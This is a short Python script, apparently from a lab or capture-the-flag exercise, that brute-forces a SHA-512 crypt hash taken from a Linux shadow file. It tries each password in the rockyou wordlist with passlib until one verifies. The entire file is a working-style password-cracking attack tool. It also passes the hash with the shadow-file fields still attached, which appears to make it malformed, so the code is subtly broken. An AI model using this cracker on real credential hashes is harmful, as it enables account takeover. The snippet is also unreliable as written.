from passlib.hash import sha512_crypt

shadow_hash = "$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::"

with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1", errors="ignore") as file:
    for password in file:
        password = password.strip()
        if sha512_crypt.verify(password, shadow_hash):
            print(f"[+] Password found: {password}")
            break
        else:
            print(f"[-] Tried: {password}")
